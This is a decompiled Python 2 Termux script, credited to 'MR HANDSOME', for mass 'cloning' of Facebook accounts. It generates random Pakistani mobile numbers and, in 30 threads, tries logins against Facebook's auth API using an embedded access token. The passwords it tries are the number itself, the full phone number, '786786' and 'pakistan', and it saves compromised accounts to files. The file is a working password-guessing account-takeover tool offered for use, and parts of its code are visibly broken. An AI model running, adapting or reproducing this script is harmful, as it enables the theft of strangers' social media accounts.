# Decompiled By MR HANDSOME
# Github : https://github.com/HANDSOME209
# uncompyle6 version 3.7.4
# Original written By MR HANDSOME

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(20000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 Amir.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully '
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(x):
    for e in x + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = ['   ', '. ', '.. ', '...', '. ', '.. ', '...', '']
    for o in titik:
        print '\r\x1b[1;96m \x1b[1;96m               Load\x1b[1;96ming\x1b[1;0m\x1b[1;96m' + o,
        sys.stdout.flush()
        time.sleep(0.5)

##### LOGO #####
logo = """
              
  \033[1;32;40m
##     ## ##    ## ########   ######  ##     ## 
##     ## ###   ## ##     ## ##    ## ###   ### 
##     ## ####  ## ##     ## ##       #### #### 
######### ## ## ## ##     ##  ######  ## ### ## 
##     ## ##  #### ##     ##       ## ##     ## 
##     ## ##   ### ##     ## ##    ## ##     ## 
##     ## ##    ## ########   ######  ##     ## 
\033[1;37m══════════════════════════════════════════════════
\033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m𝐇𝐀𝐍𝐃𝐒𝐎𝐌𝐄
\033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m𝐌𝐫 𝐇𝐚𝐧𝐝𝐬𝐨𝐦𝐞
\033[1;32m𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌   \033[1;31m ➟   \033[1;32m𝐇𝐚𝐧𝐝𝐬𝐨𝐦𝐞__𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥_     
\033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁  \033[1;31m ➟   \033[1;32m𝐇𝐀𝐍𝐃𝐒𝐎𝐌𝐄 𝐖𝐎𝐑𝐋𝐃
\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.7       
\033[1;32m𝐓𝐎𝐎𝐋𝐒 𝐒𝐓𝐀𝐓𝐔𝐒 \033[1;31m ➟   \033[1;32m𝐅𝐑𝐄𝐄
\033[1;37m HANDSOME TURMEX COMMANDS
\033[1;37m══════════════════════════════════════════════════
                                                 """
logo1 = '     \n\n\x1b[4;96mSELECT PAK  SIM CODE \x1b[1;0m\n\x1b[1;96m[1] Jazz    \x1b[1;97m 00,01,02,03,04,05,06,07,08\n\x1b[1;96m[2] Zong    \x1b[1;97m 11,12,13,14,15,16,17\n\x1b[1;96m[3] Warid   \x1b[1;97m 21,22,23,24,25\n\x1b[1;96m[4] Ufone   \x1b[1;97m 30,31,32,33,34,35\n\x1b[1;96m[5] Telenor \x1b[1;97m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []

def menu():
    os.system('clear')
    print logo
    print(47*'-')
    print
    jalan ('\x1b[1;96m[1] START RANDOM NUMBER CLONING ')
    print
    print(47*'-')
    action()

def action():
    global cpb
    global oks
    ss = raw_input('\x1b[1;96mselect 1= ')
    if ss == '':
        print '[!] Warning'
        action()
    elif ss == '1':
        tik()
        os.system('clear')
        print logo
        print logo1
        try:
            c = raw_input('\x1b[1;97mCODE : ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ss == '0':
        exb()
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    os.system('clear')
    print logo
    jalan ('\x1b[1;97mUse without internet sim.minimize termux and check every 10 minutes  later. airplane mode use every 10 mint.')
    print(47*'-')
    xxx = str(len(id))
    jalan('\x1b[1;97m              TOTAL IDS :\x1b[1;96m ' + xxx)
    print(47*'-')
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;96m  [HANDSOME_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [HANDSOME_CP] ' + k + c + user + '  |  ' + pass1
                cps = open('save/CP.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [HANDSOME_CP] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [HANDSOME_OK] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [HANDSOME_CP]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [HANDSOME_OK] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                       pass4 = 'pakistan'
                       data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                       q = json.load(data)
                       if 'access_token' in q:
                        print '\x1b[1;96m  [HANDSOME_CP]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass4 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                       elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [HANDSOME_OK] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/CP.txt', 'a')
                        cps.write(k + c + user + pass4 + '\n')
                        cps.close()
                        cpb.append(c + user + pass4)
                        
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print(48*"-")
    print 'Process Has Been Completed ...'
    print 'Total OK : ' + str(len(oks))
    print 'Total CP : ' + str(len(cpb))
    print(47*"-")
    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
    jalan('Note : Cp account Will Open after 5 to 7 days')
    raw_input('\n\x1b[1;97m[\x1b[1;98melite_menu_Back\x1b[1;95m]')
    login()


if __name__ == '__main__':
    menu()

